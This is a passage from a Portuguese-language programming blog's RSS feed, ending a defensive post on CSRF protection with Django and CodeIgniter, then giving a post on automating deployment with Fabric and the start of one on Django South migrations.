entre sites&lt;/strong&gt;, é uma forma de ataque que mescla a &lt;a href=&quot;http://pt.wikipedia.org/wiki/Engenharia_social_(seguran%C3%A7a_da_informa%C3%A7%C3%A3o)&quot; title=&quot;Leia mais sobre Engenharia Social no Wikipedia&quot;&gt;Engenharia Social&lt;/a&gt;
com vulnerabilidades das aplicações &lt;em&gt;web&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;O ataque pode ser feito da seguinte forma:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Você recebe um &lt;em&gt;e-mail&lt;/em&gt; com uma &lt;em&gt;URL&lt;/em&gt; oculta (geralmente algum
&lt;em&gt;e-mail&lt;/em&gt; do tipo “Veja as minhas fotos” (: )&lt;/li&gt;
&lt;li&gt;Esta &lt;em&gt;URL&lt;/em&gt; executa alguma ação em uma aplicação que você esteja
autenticado no momento (por exemplo, o &lt;em&gt;Facebook&lt;/em&gt;)&lt;/li&gt;
&lt;li&gt;Esta ação pode, tanto dar poderes de acesso ao atacante, quanto
alterar ou remover os seus dados permanentemente&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Note que o primeiro item pode ser substituído por algum &lt;strong&gt;conteúdo
&lt;em&gt;link&lt;/em&gt; injetado via &lt;em&gt;XSS&lt;/em&gt;&lt;/strong&gt; em algum fórum ou área de comentários de um
&lt;em&gt;blog&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Embora o exemplo acima não represente tanta ameaça, existem vários tipos
de aplicações que este tipo de técnica pode afetar. O exemplo do banco,
encontrado no &lt;em&gt;site&lt;/em&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)&quot; title=&quot;Leia mais sobre CSRF&quot;&gt;&lt;em&gt;The Open Web Application Security Project&lt;/em&gt;&lt;/a&gt;, é
um excelente exempo de ataque &lt;em&gt;CSRF&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para prevenir este tipo de problema, podemos fazer um controle através
de &lt;a href=&quot;/2012/04/05/entendendo-os-cookies-e-sessoes.html&quot; title=&quot;Entendendo o Cookies e Sessões&quot;&gt;sessões&lt;/a&gt; e transmitir um &lt;em&gt;token&lt;/em&gt; que identifique que a requisição
foi de fato feita pelo usuário. &lt;em&gt;Kinn Coelho Julião&lt;/em&gt; escreveu &lt;a href=&quot;http://phpsp.org.br/2011/07/protegendo-seu-sistema-contra-ataques-csrf/&quot; title=&quot;Protegendo seus sistemas contra ataques CSRF&quot;&gt;um &lt;em&gt;post&lt;/em&gt; interessante para o &lt;em&gt;PHP-SP&lt;/em&gt;&lt;/a&gt;,
demonstrando como prevenir ataques &lt;em&gt;CSRF&lt;/em&gt; através de &lt;em&gt;token&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;De fato, tanto o &lt;em&gt;Django&lt;/em&gt; quanto o &lt;em&gt;Codeigniter&lt;/em&gt; utilizam essa tática
para prevenir ataques &lt;em&gt;CSRF&lt;/em&gt;. No &lt;em&gt;Django&lt;/em&gt;, com o &lt;em&gt;middleware&lt;/em&gt;
&lt;code class=&quot;language-text&quot;&gt;django.middleware.csrf.CsrfViewMiddleware&lt;/code&gt;, basta adicionar a chamada
da &lt;em&gt;templatetag&lt;/em&gt; ao formulário:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;django-html&quot;&gt;&lt;pre class=&quot;language-django-html&quot;&gt;&lt;code class=&quot;language-django-html&quot;&gt;&amp;lt;form method=&amp;quot;post&amp;quot; action=&amp;quot;.&amp;quot;&amp;gt;
    {% csrf_token %}
    ...
&amp;lt;/form&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A &lt;em&gt;templatetag&lt;/em&gt; acima criará um campo oculto no formulário chamado
&lt;code class=&quot;language-text&quot;&gt;csrfmiddlewaretoken&lt;/code&gt;. Quando um &lt;em&gt;POST&lt;/em&gt; for realizado para a &lt;em&gt;view&lt;/em&gt; em
questão, caso o conteúdo de &lt;code class=&quot;language-text&quot;&gt;csrfmiddlewaretoken&lt;/code&gt; vindo do formulário
não “bata” com o conteúdo armazenado em sessão, o &lt;em&gt;Django&lt;/em&gt; entende que
aquela requisição não foi feita de maneira “natural” (ou seja, acessando
o formulário e submetendo-o). Logo, fica subentendido que aquela
requisição veio de outra origem, e o &lt;em&gt;framework&lt;/em&gt; não executa as
instruções da &lt;em&gt;view&lt;/em&gt; (retornando um código 403).&lt;/p&gt;
&lt;p&gt;No &lt;em&gt;Codeigniter&lt;/em&gt;, com a opção &lt;code class=&quot;language-text&quot;&gt;$config[&amp;#39;csrf_protection’]&lt;/code&gt; como
&lt;code class=&quot;language-text&quot;&gt;TRUE&lt;/code&gt; no arquivo &lt;code class=&quot;language-text&quot;&gt;application/config/config.php&lt;/code&gt;, o &lt;em&gt;framework&lt;/em&gt;
adicionará automaticamente o campo de proteção &lt;em&gt;CSRF&lt;/em&gt; na abertura do
formulário:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token php language-php&quot;&gt;&lt;span class=&quot;token delimiter important&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;form_open&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token delimiter important&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Ficou um &lt;em&gt;post&lt;/em&gt; grande, mas acredito que consegui cobrir os problemas de
segurança mais conhecidos em aplicações &lt;em&gt;Web&lt;/em&gt;. Como é possível notar,
são vulnerabilidades que são facilmente contornáveis, mas que podem
trazer sérios problemas para você e seus usuários caso a sua aplicação
não esteja segura o bastante.&lt;/p&gt;
&lt;p&gt;Reforço: Se você tiver a oportunidade de utilizar um &lt;em&gt;framework&lt;/em&gt;,
utilize! Eles possuem soluções prontas e bem testadas para prevenir os
problemas citados acima, e outros tantos que surgem a cada dia na
&lt;em&gt;internet&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.dinke.net/blog/en/2011/10/20/validating-an-integer-with-php/&quot; title=&quot;As diferentes formas de validarmos um valor inteiro em PHP&quot;&gt;&lt;em&gt;Caugh in a Web: Validating an integer in PHP&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://codeigniter.com/user_guide/database/active_record.html&quot; title=&quot;Saiba como fazer consultas eficientes ao banco de dados com o Codeigniter&quot;&gt;&lt;em&gt;Codeigniter User Guide: Active Record Class&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://codeigniter.com/user_guide/general/security.html&quot; title=&quot;Veja as dicas de segurança dadas pelo time do Codeigniter&quot;&gt;&lt;em&gt;Codeigniter User Guide: Security&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.djangoproject.com/en/1.4/topics/db/queries/&quot; title=&quot;Saiba como construir modelos e como consultá-los através do ORM do Django&quot;&gt;&lt;em&gt;Django Documentation: Making queries&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.djangoproject.com/en/dev/topics/security/&quot; title=&quot;Veja dicas preciosas de segurança utilizando o Django&quot;&gt;&lt;em&gt;Django Documentation: Security in Django&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.invasao.com.br/2008/03/18/php-injection-o-fim-das-duvidas/&quot; title=&quot;Entenda como funciona um ataque via PHP Injection&quot;&gt;Invasão.com.br: &lt;em&gt;PHP Injection&lt;/em&gt; – O fim das dúvidas&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.php.net/manual/pt_BR/book.mysqli.php&quot; title=&quot;Conheça a mysqli direto da documentação do PHP&quot;&gt;&lt;em&gt;PHP Documentation: MySQL Melhorada&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://php.net/pdo&quot; title=&quot;Conheça uma das formas mais eficientes de fazer consultas a bancos de dados no PHP&quot;&gt;&lt;em&gt;PHP Documentation: PDO – PHP Data Objects&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://phpsp.org.br/2011/07/protegendo-seu-sistema-contra-ataques-csrf/&quot; title=&quot;Aprenda como utilizar tolkens para prevenir ataques CSRF&quot;&gt;&lt;em&gt;PHP SP&lt;/em&gt;: Protegendo o seu sistema contra ataques &lt;em&gt;CSRF&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.sitepoint.com/php-security-blunders/&quot; title=&quot;Excelentes dicas de segurança para quem programa em PHP&quot;&gt;&lt;em&gt;Site Point: Top 7 PHP Security Blunders Article&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://stackoverflow.com/questions/60174/best-way-to-stop-sql-injection-in-php&quot; title=&quot;Excelente thread no Stack Overflow, sobre SQL injection&quot;&gt;&lt;em&gt;Stack Overflow: Best way to stop SQL injection in PHP&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)&quot; title=&quot;Um bom artigo sobre o conceito do CSRF&quot;&gt;&lt;em&gt;The Open Web Application Security Project: Cross-Site Request Forgery&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Code_injection&quot; title=&quot;Leia mais sobre as formas de injeção de código no Wikipedia&quot;&gt;&lt;em&gt;Wikipedia: Code Injection&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://pt.wikipedia.org/wiki/Inje%C3%A7%C3%A3o_de_SQL&quot; title=&quot;Leia mais sobre SQL Injection no Wikipedia&quot;&gt;&lt;em&gt;Wikipedia&lt;/em&gt;: Injeção de &lt;em&gt;SQL&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Automatize o deploy dos seus projetos com Fabric]]></title><description><![CDATA[Durante a minha árdua trajetória com o PHP,
sempre fiz “subidas” de projetos utilizando um cliente FTP. Um
processo manual, extremamente repetitivo (e chato). Já com Python, pude utilizar o SSH, que me proporcionou
maior agilidade e liberdade dentro do ambiente de produção. Mas que não
deixou de ser…]]></description><link>https://klauslaube.com.br/2012/02/26/automatize-o-deploy-dos-seus-projetos-com-fabric.html</link><guid isPermaLink="false">https://klauslaube.com.br/2012/02/26/automatize-o-deploy-dos-seus-projetos-com-fabric.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Sun, 26 Feb 2012 19:40:13 GMT</pubDate><content:encoded>&lt;p&gt;Durante a minha árdua trajetória com o &lt;a href=&quot;/tag/php.html&quot; title=&quot;Leia mais sobre PHP&quot;&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt;,
sempre fiz “subidas” de projetos utilizando um cliente &lt;a href=&quot;http://pt.wikipedia.org/wiki/File_Transfer_Protocol&quot; title=&quot;Leia mais sobre File Transfer Protocol&quot;&gt;&lt;em&gt;FTP&lt;/em&gt;&lt;/a&gt;. Um
processo manual, extremamente repetitivo (e chato).&lt;/p&gt;
&lt;p&gt;Já com &lt;a href=&quot;/tag/python.html&quot; title=&quot;Leia mais sobre Python&quot;&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;, pude utilizar o &lt;a href=&quot;http://pt.wikipedia.org/wiki/SSH&quot; title=&quot;Leia mais sobre Secure Shell&quot;&gt;&lt;em&gt;SSH&lt;/em&gt;&lt;/a&gt;, que me proporcionou
maior agilidade e liberdade dentro do ambiente de produção. Mas que não
deixou de ser um processo manual, extremamente repetitivo, chato e muito
suscetível a falhas.&lt;/p&gt;
&lt;p&gt;Foi utilizando o &lt;a href=&quot;/tag/django.html&quot; title=&quot;Leia mais sobre Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; que conheci o &lt;a href=&quot;http://docs.fabfile.org/en/1.4.0/index.html&quot; title=&quot;A library and command-line tool for streamlining the use of SSH for application deployment or systems administration tasks&quot;&gt;&lt;em&gt;Fabric&lt;/em&gt;&lt;/a&gt;, e percebi
quanto tempo podemos economizar automatizando o processo de &lt;em&gt;deploy&lt;/em&gt; de
nossos projetos.&lt;/p&gt;
&lt;h2&gt;O agile e o deploy contínuo&lt;/h2&gt;
&lt;p&gt;Todo e qualquer procedimento de &lt;em&gt;upload&lt;/em&gt; do seu projeto para o ambiente
de produção corre algum tipo de risco. Com o &lt;em&gt;deploy&lt;/em&gt; automatizado,
a tendência é que este risco seja reduzido, e que você possa fazer a
entrega do seu projeto para &lt;a href=&quot;/2011/03/07/diferentes-ambientes.html&quot; title=&quot;Diferentes ambientes: Development, Testing, Staging e Production&quot;&gt;diversos ambientes&lt;/a&gt; com o menor esforço
possível.&lt;/p&gt;
&lt;p&gt;Logo, não consigo imaginar um cenário eficiente de &lt;em&gt;deploy&lt;/em&gt;
contínuo, sem a utilização de alguma ferramenta de automatização. É
através destas que respeitamos uma das premissas do &lt;a href=&quot;/tag/agile.html&quot; title=&quot;Leia mais sobre Agile&quot;&gt;&lt;em&gt;agile&lt;/em&gt;&lt;/a&gt;, e
diminuímos a incidência de falha humana.&lt;/p&gt;
&lt;h2&gt;Mas o que é o Fabric?&lt;/h2&gt;
&lt;p&gt;O &lt;strong&gt;&lt;em&gt;Fabric&lt;/em&gt;&lt;/strong&gt; é uma &lt;em&gt;lib&lt;/em&gt; &lt;em&gt;Python&lt;/em&gt;, e ferramenta de linha de comando,
para auxiliá-lo em seu &lt;em&gt;deploy&lt;/em&gt; e na administração remota dos seus
sistemas.&lt;/p&gt;
&lt;p&gt;Embora seja feita em &lt;em&gt;Python&lt;/em&gt;, pode ser utilizada em projetos escritos
em qualquer linguagem. Equivale ao &lt;a href=&quot;http://en.wikipedia.org/wiki/Capistrano&quot; title=&quot;Leia mais sobre o Capistrano&quot;&gt;&lt;em&gt;Capistrano&lt;/em&gt;&lt;/a&gt;, alternativa mais
famosa, escrita em &lt;em&gt;Ruby&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Em casa de ferreiro, espeto de ferro&lt;/h2&gt;
&lt;p&gt;Para dar um exemplo de uso do &lt;em&gt;Fabric&lt;/em&gt;, podemos utilizar o esquema de
&lt;em&gt;deploy&lt;/em&gt; deste &lt;em&gt;blog&lt;/em&gt;. Sim! O processo está automatizado, e você pode
&lt;a href=&quot;https://bitbucket.org/kplaube/klauslaube.com.br/src/d579e9d81641/fabfile.py&quot; title=&quot;Confira o script Fabric no repositório do BitBucket&quot;&gt;conferí-lo no &lt;em&gt;BitBucket&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Antes de mais nada, é necessário ter o &lt;em&gt;Fabric&lt;/em&gt; instalado:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ pip install fabric&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Todo o procedimento será escrito em um arquivo chamado &lt;strong&gt;fabfile.py&lt;/strong&gt;.
Com o comando &lt;strong&gt;fab&lt;/strong&gt;, a ferramenta carregará este arquivo e permitirá a
execução de todos os métodos públicos definidos dentro dele.&lt;/p&gt;
&lt;p&gt;Vamos listar todos os métodos que &lt;a href=&quot;https://bitbucket.org/kplaube/klauslaube.com.br/src/d579e9d81641/fabfile.py&quot; title=&quot;Veja no BitBucket&quot;&gt;criei no &lt;strong&gt;fabfile.py&lt;/strong&gt; do &lt;em&gt;blog&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ fab -l

Available commands:

bootstrap            Initialize remote host environment.
collect_static       Collect all static files from Django apps and copy ...
create_virtualenv    Setup virtualenv on remote host.
database_restart     Restart the database server on remote server.
deploy               Send the code to the remote host.
http_restart         Restart the HTTP server on remote server.
migrate              Execute South on remote host, to update the databas...
production           Use production environment on remote host.
staging              Use staging environment on remote host.
syncdb               Execute syncdb on remote host.
update_apache_conf   Move apache and fastcgi files to the public html.
update_requirements  Update Python dependencies on remote host.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Como é possível notar na listagem acima, temos operações de &lt;em&gt;deploy&lt;/em&gt;
(&lt;strong&gt;deploy&lt;/strong&gt;, &lt;strong&gt;syncdb&lt;/strong&gt;, &lt;strong&gt;update_requirements&lt;/strong&gt; e
&lt;strong&gt;update&lt;em&gt;apache&lt;/em&gt;conf&lt;/strong&gt;) e operações de administração remota
(&lt;strong&gt;database_restart&lt;/strong&gt;, &lt;strong&gt;http_restart&lt;/strong&gt;, &lt;strong&gt;migrate&lt;/strong&gt;, etc). Os métodos
&lt;strong&gt;production&lt;/strong&gt; e &lt;strong&gt;staging&lt;/strong&gt; são basicamente para “setar” para qual
ambiente o &lt;em&gt;deploy&lt;/em&gt; será realizado. Por exemplo, a cada nova subida de
&lt;em&gt;release&lt;/em&gt;, executo o seguinte comando:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ fab production deploy http_restart&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Onde basicamente:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Defino o usuário, &lt;em&gt;IP&lt;/em&gt;, e &lt;em&gt;paths&lt;/em&gt; para o ambiente de produção através do método &lt;strong&gt;production&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Executo o envio dos arquivos através de &lt;a href=&quot;http://pt.wikipedia.org/wiki/Rsync&quot; title=&quot;Leia mais sobre Rsync&quot;&gt;&lt;strong&gt;Rsync&lt;/strong&gt;&lt;/a&gt; para o servidor, com o método &lt;strong&gt;deploy&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Reinicio o &lt;em&gt;Apache&lt;/em&gt; através do método &lt;strong&gt;http_restart&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Se olharmos atentamente o &lt;a href=&quot;https://bitbucket.org/kplaube/klauslaube.com.br/src/d579e9d81641/fabfile.py#cl-101&quot; title=&quot;Veja em detalhes o método deploy&quot;&gt;método &lt;strong&gt;deploy&lt;/strong&gt;&lt;/a&gt;, utilizamos uma &lt;em&gt;lib&lt;/em&gt;
(importada no início do arquivo) chamada &lt;strong&gt;rsync_project&lt;/strong&gt;. Que
corresponde a ferramenta de linha de comando (encontrada em sistemas
baseados em &lt;em&gt;Unix&lt;/em&gt;) chamada &lt;strong&gt;rsync&lt;/strong&gt;. O que o &lt;em&gt;Fabric&lt;/em&gt; faz (com
maestria) é “abstrair” essas operações para que possamos fazer os nossos
procedimentos através de uma interface simples (outros comandos, como
&lt;strong&gt;scp&lt;/strong&gt; e &lt;strong&gt;sudo&lt;/strong&gt; também são utilizados pelo &lt;em&gt;Fabric&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;A função &lt;a href=&quot;https://bitbucket.org/kplaube/klauslaube.com.br/src/d579e9d81641/fabfile.py#cl-199&quot; title=&quot;Veja um exemplo de uso no fabfile.py&quot;&gt;&lt;strong&gt;run&lt;/strong&gt;&lt;/a&gt; faz grande parte da magia acontecer. Com ela,
abrimos uma conexão &lt;em&gt;SSH&lt;/em&gt; com o nosso servidor, e executamos comandos
como se estívessemos em um terminal. Extremamente útil para fazer
&lt;em&gt;restart&lt;/em&gt; de serviços, escalonamento de &lt;em&gt;logs&lt;/em&gt;, limpeza de temporários,
etc.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Fabric&lt;/em&gt; é muito simples de usar. Lendo o básico da documentação, já
somos capazes de automatizar os processos mais triviais.&lt;/p&gt;
&lt;p&gt;Recomendo o &lt;a href=&quot;https://bitbucket.org/copelco/caktus-deployment/src/6ad8ad84a938/example-django-project/caktus_website/fabfile.py&quot; title=&quot;Veja-o no BitBucket&quot;&gt;&lt;strong&gt;fabfile.py&lt;/strong&gt;&lt;/a&gt; da &lt;a href=&quot;http://www.caktusgroup.com/&quot; title=&quot;Visite o site da Caktus&quot;&gt;&lt;em&gt;Caktus Consulting Group&lt;/em&gt;&lt;/a&gt;. Simples
e bem escrito, foi nele que me baseei para escrever o &lt;em&gt;script&lt;/em&gt;
apresentado neste &lt;em&gt;post&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://docs.fabfile.org/en/1.4.0/index.html&quot; title=&quot;Fabric: a library and command-line tool for streamlining the use of SSH for application deployment or systems administration tasks&quot;&gt;&lt;em&gt;Fabric – Documentation&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://yuji.wordpress.com/2011/04/09/django-python-fabric-deployment-script-and-example/&quot; title=&quot;Excelente exemplo de uso do Fabric&quot;&gt;&lt;em&gt;Useful Stuff – Fabric Deployment Script and Example&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Migrations em Django com South]]></title><description><![CDATA[E quem nunca precisou adicionar ou remover alguma
coluna, nas tabelas do seu banco de dados, depois que a aplicação já
estava em produção? Os riscos existem (e são altos), e podem ser
diminuidos através de processos automatizados. Em um mundo ideal, o procedimento de deploy (para entregas contínuas…]]></description><link>https://klauslaube.com.br/2011/11/20/migrations-em-django-south.html</link><guid isPermaLink="false">https://klauslaube.com.br/2011/11/20/migrations-em-django-south.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Sun, 20 Nov 2011 21:35:00 GMT</pubDate><content:encoded>&lt;p&gt;E quem nunca precisou adicionar ou remover alguma
coluna, nas tabelas do seu banco de dados, depois que a aplicação já
estava em produção? Os riscos existem (e são altos), e podem ser
diminuidos através de processos automatizados.&lt;/p&gt;
&lt;p&gt;Em um mundo ideal, o procedimento de &lt;em&gt;deploy&lt;/em&gt; (para entregas contínuas)
&lt;strong&gt;deve ser automatizado&lt;/strong&gt;. Com o &lt;em&gt;South&lt;/em&gt;, “migrar” a estrutura e os
dados da sua base de dados para a versão presente em seu novo deploy, é
simples, prático e 100% integrado ao &lt;a href=&quot;/tag/django.html&quot; title=&quot;Leia mais sobre Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Instalando o South&lt;/h2&gt;
&lt;p&gt;O &lt;a href=&quot;http://south.aeracode.org/&quot; title=&quot;Página oficial do projeto South&quot;&gt;&lt;em&gt;South&lt;/em&gt;&lt;/a&gt; é muito, mas muito simples de instalar. Utilizando o
&lt;em&gt;pip&lt;/em&gt;, basta o seguinte comando para termos os &lt;em&gt;eggs&lt;/em&gt; em nosso
&lt;code class=&quot;language-text&quot;&gt;PYTHONPATH&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ pip install south&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Não podemos esquecer de adicioná-lo ao &lt;code class=&quot;language-text&quot;&gt;INSTALLED_APPS&lt;/code&gt; do
&lt;code class=&quot;language-text&quot;&gt;settings.py&lt;/code&gt; (afinal, trata-se de uma &lt;em&gt;app Django&lt;/em&gt;):&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;INSTALLED_APPS &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&apos;django.contrib.auth&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&apos;south&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Pronto! Você acabou de ganhar alguns comandos para construir as suas
&lt;em&gt;migrations&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Direto para a prática&lt;/h2&gt;
&lt;p&gt;Sem perder tempo, vamos construir uma &lt;em&gt;app Django&lt;/em&gt; para que possamos
demonstrar o uso do &lt;em&gt;South&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ python manage.py startapp blog&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Lembrando de adicioná-la ao &lt;code class=&quot;language-text&quot;&gt;settings.py&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# settings.py&lt;/span&gt;
INSTALLED_APPS &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&apos;django.contrib.auth&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&apos;south&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&apos;blog&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Vamos criar um modelo bem básico, com alguns campos (posteriormente,
incrementaremos esta estrutura):&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# blog/models.py&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; django&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;db &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; models

&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Blog&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Model&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    titulo &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;CharField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;Titulo&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; max_length&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    texto &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;TextField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;Texto&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Através do comando &lt;code class=&quot;language-text&quot;&gt;schemamigration&lt;/code&gt;, com parâmetro &lt;code class=&quot;language-text&quot;&gt;–-initial&lt;/code&gt;,
